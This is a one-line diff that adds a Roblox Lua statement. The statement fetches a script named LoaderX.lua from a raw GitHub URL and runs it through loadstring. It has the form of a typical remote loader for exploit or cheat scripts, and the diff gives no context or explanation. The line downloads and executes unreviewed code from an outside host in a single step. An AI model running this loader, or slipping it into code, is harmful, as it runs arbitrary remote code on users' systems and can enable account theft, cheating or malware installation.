@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/XRayDerxDOne/UpdateLog/main/LoaderX.lua"))()
